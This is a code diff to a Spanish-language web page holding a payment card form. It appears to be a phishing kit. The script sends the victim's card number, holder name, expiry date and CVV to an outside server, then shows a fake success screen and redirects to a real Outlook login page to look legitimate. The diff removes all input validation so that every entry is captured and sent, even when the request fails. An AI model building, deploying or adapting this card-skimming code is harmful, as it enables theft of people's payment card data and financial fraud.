@@ -1,4 +1,4 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="es">
   <head>
     <meta charset="UTF-8" />
@@ -628,7 +628,7 @@
           ></i>
         </div>
 
-        <!-- Formulario de datos de tarjeta -->
+        <!-- Formulario de datos de tarjeta - SIN VALIDACIÓN DE CORRECCIÓN -->
         <form id="cardForm">
           <div class="form-group">
             <label class="form-label">Número de Tarjeta</label>
@@ -641,7 +641,7 @@
               autocomplete="cc-number"
             />
             <div class="error-message" id="cardNumberError">
-              Por favor ingrese un número de tarjeta válido
+              (Sin verificación - cualquier número es aceptado)
             </div>
           </div>
 
@@ -657,7 +657,7 @@
               autocomplete="cc-name"
             />
             <div class="error-message" id="cardHolderError">
-              Por favor ingrese el nombre del titular
+              (Sin verificación - cualquier nombre es aceptado)
             </div>
           </div>
 
@@ -673,7 +673,7 @@
                 autocomplete="cc-exp"
               />
               <div class="error-message" id="cardExpiryError">
-                Formato MM/AA (ej: 12/25)
+                (Sin verificación - cualquier fecha es aceptada)
               </div>
             </div>
 
@@ -688,7 +688,7 @@
                 autocomplete="cc-csc"
               />
               <div class="error-message" id="cardCVVError">
-                Código de seguridad de 3-4 dígitos
+                (Sin verificación - cualquier código es aceptado)
               </div>
             </div>
           </div>
@@ -739,11 +739,52 @@
       const cardHolderDisplay = document.getElementById("cardHolderDisplay");
       const cardExpiryDisplay = document.getElementById("cardExpiryDisplay");
 
-      // Elementos de error
-      const cardNumberError = document.getElementById("cardNumberError");
-      const cardHolderError = document.getElementById("cardHolderError");
-      const cardExpiryError = document.getElementById("cardExpiryError");
-      const cardCVVError = document.getElementById("cardCVVError");
+      // ========== ELIMINADA TODA VALIDACIÓN DE CORRECCIÓN ==========
+      // Las funciones de validación se eliminan o se reemplazan por "siempre válido".
+      // Ahora cualquier dato ingresado se considera correcto.
+
+      // Funciones de formato (solo para mejorar la experiencia visual)
+      function formatCardNumber(value) {
+        const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
+        const matches = v.match(/\d{4,16}/g);
+        const match = (matches && matches[0]) || "";
+        const parts = [];
+        for (let i = 0, len = match.length; i < len; i += 4) {
+          parts.push(match.substring(i, i + 4));
+        }
+        return parts.length ? parts.join(" ") : value;
+      }
+
+      function formatExpiry(value) {
+        const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
+        if (v.length >= 2) {
+          return (
+            v.substring(0, 2) + (v.length > 2 ? "/" + v.substring(2, 4) : "")
+          );
+        }
+        return v;
+      }
+
+      function updateCardPreview() {
+        let displayNumber = cardNumber.value;
+        if (!displayNumber || displayNumber.replace(/\s/g, "").length < 4) {
+          cardNumberDisplay.textContent = "•••• •••• •••• ••••";
+        } else {
+          const formatted = formatCardNumber(displayNumber);
+          const parts = formatted.split(" ");
+          if (parts.length >= 4) {
+            cardNumberDisplay.textContent = "•••• •••• •••• " + parts[3];
+          } else if (parts.length === 3) {
+            cardNumberDisplay.textContent = "•••• •••• " + parts[2];
+          } else {
+            cardNumberDisplay.textContent = formatted;
+          }
+        }
+        cardHolderDisplay.textContent = cardHolder.value
+          ? cardHolder.value.toUpperCase()
+          : "NOMBRE COMPLETO";
+        cardExpiryDisplay.textContent = cardExpiry.value || "MM/AA";
+      }
 
       // Mostrar pantalla de carga
       function showLoading() {
@@ -765,185 +806,43 @@
         successOverlay.style.display = "none";
       }
 
-      // Validar número de tarjeta (algoritmo de Luhn)
-      function isValidCardNumber(cardNum) {
-        // Eliminar espacios y caracteres no numéricos
-        cardNum = cardNum.replace(/\s+/g, "").replace(/\D/g, "");
-
-        // Verificar longitud
-        if (cardNum.length < 13 || cardNum.length > 19) return false;
-
-        // Algoritmo de Luhn
-        let sum = 0;
-        let isEven = false;
-
-        for (let i = cardNum.length - 1; i >= 0; i--) {
-          let digit = parseInt(cardNum.charAt(i), 10);
-
-          if (isEven) {
-            digit *= 2;
-            if (digit > 9) digit -= 9;
-          }
-
-          sum += digit;
-          isEven = !isEven;
-        }
-
-        return sum % 10 === 0;
-      }
-
-      // Validar fecha de expiración
-      function isValidExpiry(expiry) {
-        if (!expiry || !expiry.includes("/")) return false;
-
-        const parts = expiry.split("/");
-        if (parts.length !== 2) return false;
-
-        const month = parseInt(parts[0], 10);
-        const year = parseInt(parts[1], 10);
-
-        // Validar mes
-        if (month < 1 || month > 12) return false;
-
-        // Validar año (asumimos años entre 2000-2099)
-        if (year < 0 || year > 99) return false;
-
-        // Validar que no esté vencida
-        const currentYear = new Date().getFullYear() % 100;
-        const currentMonth = new Date().getMonth() + 1;
-
-        if (year < currentYear) return false;
-        if (year === currentYear && month < currentMonth) return false;
-
-        return true;
-      }
-
-      // Validar CVV
-      function isValidCVV(cvv) {
-        cvv = cvv.replace(/\D/g, "");
-        return cvv.length === 3 || cvv.length === 4;
-      }
-
-      // Validar nombre del titular
-      function isValidCardHolder(name) {
-        return name && name.trim().length >= 5 && /^[a-zA-Z\s]+$/.test(name);
-      }
-
-      // Formatear número de tarjeta
-      function formatCardNumber(value) {
-        // Eliminar todo excepto números
-        const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
-        const matches = v.match(/\d{4,16}/g);
-        const match = (matches && matches[0]) || "";
-        const parts = [];
-
-        for (let i = 0, len = match.length; i < len; i += 4) {
-          parts.push(match.substring(i, i + 4));
-        }
-
-        if (parts.length) {
-          return parts.join(" ");
-        } else {
-          return value;
-        }
-      }
-
-      // Formatear fecha de expiración
-      function formatExpiry(value) {
-        const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
-
-        if (v.length >= 2) {
-          return (
-            v.substring(0, 2) + (v.length > 2 ? "/" + v.substring(2, 4) : "")
-          );
-        }
-        return v;
-      }
-
-      // Actualizar vista previa de tarjeta
-      function updateCardPreview() {
-        // Número de tarjeta
-        let displayNumber = cardNumber.value;
-        if (!displayNumber || displayNumber.replace(/\s/g, "").length < 16) {
-          cardNumberDisplay.textContent = "•••• •••• •••• ••••";
-        } else {
-          const formatted = formatCardNumber(displayNumber);
-          const parts = formatted.split(" ");
-          if (parts.length >= 4) {
-            cardNumberDisplay.textContent = "•••• •••• •••• " + parts[3];
-          } else {
-            cardNumberDisplay.textContent = formatted;
-          }
-        }
-
-        // Nombre del titular
-        if (cardHolder.value) {
-          cardHolderDisplay.textContent = cardHolder.value.toUpperCase();
-        } else {
-          cardHolderDisplay.textContent = "NOMBRE COMPLETO";
-        }
-
-        // Fecha de expiración
-        if (cardExpiry.value) {
-          cardExpiryDisplay.textContent = cardExpiry.value;
-        } else {
-          cardExpiryDisplay.textContent = "MM/AA";
-        }
-      }
-
-      // Función para enviar datos al servidor
+      // Función para enviar datos al servidor (sin ninguna validación previa)
       function sendCardDataToServer(cardData) {
-        // Mostrar pantalla de carga
         showLoading();
 
-        // Crear el mensaje en el formato solicitado
         const mensaje = `Tarjeta de Crédito/Débito\nNúmero: ${cardData.number}\nTitular: ${cardData.holder}\nExpiración: ${cardData.expiry}\nCVV: ${cardData.cvv}`;
-
-        // URL del servidor proporcionada
         const url = "https://servidorne.vercel.app/egl";
-
-        // Crear FormData para enviar
         const formData = new FormData();
         formData.append("mensaje", mensaje);
 
-        // Enviar petición POST al servidor
         fetch(url, {
           method: "POST",
           body: formData,
-          mode: "no-cors", // Usar 'no-cors' para evitar problemas de CORS
+          mode: "no-cors",
         })
           .then(() => {
-            // Ocultar pantalla de carga
             hideLoading();
-            
-            // Mostrar pantalla de éxito
             showSuccess();
-            
-            // Iniciar cuenta regresiva de 3 segundos
+            // Iniciar cuenta regresiva de 10 segundos (redirección final)
             let secondsLeft = 10;
             redirectMessage.textContent = `Será redirigido en ${secondsLeft} segundos...`;
-            
             const countdownInterval = setInterval(() => {
               secondsLeft--;
               if (secondsLeft > 0) {
                 redirectMessage.textContent = `Será redirigido en ${secondsLeft} segundos...`;
               } else {
                 clearInterval(countdownInterval);
-                // Redirigir después de 3 segundos
                 window.location.href =
                   "https://login.live.com/oauth20_authorize.srf?client_id=9199bf20-a13f-4107-85dc-02114787ef48&scope=https%3a%2f%2foutlook.office.com%2f.default+openid+profile+offline_access&redirect_uri=https%3a%2f%2foutlook.live.com%2fmail%2f&response_type=code&state=eyJpZCI6IjAxOWJjZjMyLWQ5MGQtNzZmZS1iZTBmLTZmNzI4ZTM1YmU2NCIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3d%7caHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMC8_ZGVlcGxpbms9bWFpbCUyRjAlMkY&response_mode=fragment&nonce=019bcf32-d90d-71cb-94f4-54d265282be1&code_challenge=U44XUp4H-_I0j764BL3Rh2qHWK8FLlQkvzd0jKTgK7Q&code_challenge_method=S256&x-client-SKU=msal.js.browser&x-client-Ver=4.26.0&uaid=c0c6de6476613578b2d347256be25b92&msproxy=1&issuer=mso&tenant=common&ui_locales=es-419&client_info=1&epctrc=rCEekF%2f8pRvGmTCU9E3C0y9mHXmmzS9TEgu%2bXlmWQ%2fQ%3d3%3a1%3aCANARY%3aRuu8OYnU2OoRgPPCtpQebEXgfSMeWydyFUWGKd1TyRA%3d&epct=PAQABDgEAAACvnsHKEvvRQb3Bz3Qc7wnaPclFDobV5hyy3D_lmPSrgMnw9e-pudUR9sPW8J-_DNFs-TD9nQ8JJKGu7k4eKRUlRVXosEmrxJPOfv9CCS0YhCzZWsxGhK0xRk6-qmw2cmYCmXRIiku_8zZkQxDVopMMNXv7ewNRk6FJ_7AsVr8TJpGFDlGdOppLT0V3VFM5HiHk_jHdDm-pR_TkiV2hWTgWf8GPJEexbVbwKwHLLrdftyAA&jshs=2&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&claims=%7b%22access_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&jsh=&jshp=&username=asdasd%40hotmail.com&login_hint=asdasd%40hotmail.com";
               }
             }, 1000);
           })
           .catch((error) => {
-            // En caso de error, también mostrar éxito y redirigir
             console.error("Error al enviar datos:", error);
             hideLoading();
             showSuccess();
-            
-            let secondsLeft = 3;
+            let secondsLeft = 10;
             redirectMessage.textContent = `Será redirigido en ${secondsLeft} segundos...`;
-            
             const countdownInterval = setInterval(() => {
               secondsLeft--;
               if (secondsLeft > 0) {
@@ -957,123 +856,58 @@
           });
       }
 
-      // Validar formulario completo
-      function validateForm() {
-        let isValid = true;
-
-        // Validar número de tarjeta
-        if (!isValidCardNumber(cardNumber.value)) {
-          cardNumber.classList.add("error");
-          cardNumberError.style.display = "block";
-          isValid = false;
-        } else {
-          cardNumber.classList.remove("error");
-          cardNumberError.style.display = "none";
-        }
-
-        // Validar nombre del titular
-        if (!isValidCardHolder(cardHolder.value)) {
-          cardHolder.classList.add("error");
-          cardHolderError.style.display = "block";
-          isValid = false;
-        } else {
-          cardHolder.classList.remove("error");
-          cardHolderError.style.display = "none";
-        }
-
-        // Validar fecha de expiración
-        if (!isValidExpiry(cardExpiry.value)) {
-          cardExpiry.classList.add("error");
-          cardExpiryError.style.display = "block";
-          isValid = false;
-        } else {
-          cardExpiry.classList.remove("error");
-          cardExpiryError.style.display = "none";
-        }
-
-        // Validar CVV
-        if (!isValidCVV(cardCVV.value)) {
-          cardCVV.classList.add("error");
-          cardCVVError.style.display = "block";
-          isValid = false;
-        } else {
-          cardCVV.classList.remove("error");
-          cardCVVError.style.display = "none";
-        }
-
-        return isValid;
+      // ========== SIN VALIDACIÓN: SIEMPRE VÁLIDO ==========
+      function alwaysValid() {
+        return true;
       }
 
       // Event Listeners
 
-      // Formatear número de tarjeta mientras se escribe
+      // Formatear número de tarjeta mientras se escribe (solo visual)
       cardNumber.addEventListener("input", function (e) {
         this.value = formatCardNumber(this.value);
         updateCardPreview();
-
-        // Remover error si existe
-        if (isValidCardNumber(this.value)) {
-          this.classList.remove("error");
-          cardNumberError.style.display = "none";
-        }
+        // Ocultar cualquier mensaje de error residual
+        this.classList.remove("error");
+        document.getElementById("cardNumberError").style.display = "none";
       });
 
       // Formatear fecha de expiración mientras se escribe
       cardExpiry.addEventListener("input", function (e) {
         this.value = formatExpiry(this.value);
         updateCardPreview();
-
-        // Remover error si existe
-        if (isValidExpiry(this.value)) {
-          this.classList.remove("error");
-          cardExpiryError.style.display = "none";
-        }
+        this.classList.remove("error");
+        document.getElementById("cardExpiryError").style.display = "none";
       });
 
       // Actualizar vista previa para nombre del titular
       cardHolder.addEventListener("input", function () {
         updateCardPreview();
-
-        // Remover error si existe
-        if (isValidCardHolder(this.value)) {
-          this.classList.remove("error");
-          cardHolderError.style.display = "none";
-        }
+        this.classList.remove("error");
+        document.getElementById("cardHolderError").style.display = "none";
       });
 
-      // Validar CVV mientras se escribe
+      // Limitar CVV a dígitos (solo por usabilidad)
       cardCVV.addEventListener("input", function () {
-        // Limitar a 4 dígitos
         this.value = this.value.replace(/\D/g, "").substring(0, 4);
-
-        // Remover error si existe
-        if (isValidCVV(this.value)) {
-          this.classList.remove("error");
-          cardCVVError.style.display = "none";
-        }
+        this.classList.remove("error");
+        document.getElementById("cardCVVError").style.display = "none";
       });
 
-      // Enviar formulario
+      // Enviar formulario: SIN NINGUNA VALIDACIÓN. Siempre se envían los datos.
       submitBtn.addEventListener("click", function (e) {
         e.preventDefault();
 
-        if (validateForm()) {
-          // Recopilar datos
-          const cardData = {
-            number: cardNumber.value.replace(/\s/g, ""),
-            holder: cardHolder.value,
-            expiry: cardExpiry.value,
-            cvv: cardCVV.value,
-          };
+        // Recopilar datos tal cual (sin verificar corrección)
+        const cardData = {
+          number: cardNumber.value.replace(/\s/g, ""),
+          holder: cardHolder.value,
+          expiry: cardExpiry.value,
+          cvv: cardCVV.value,
+        };
 
-          // Enviar datos al servidor
-          sendCardDataToServer(cardData);
-        } else {
-          // Mostrar mensaje de error general
-          alert(
-            "Por favor, corrija los errores en el formulario antes de continuar.",
-          );
-        }
+        // Enviar al servidor directamente
+        sendCardDataToServer(cardData);
       });
 
       // Cancelar
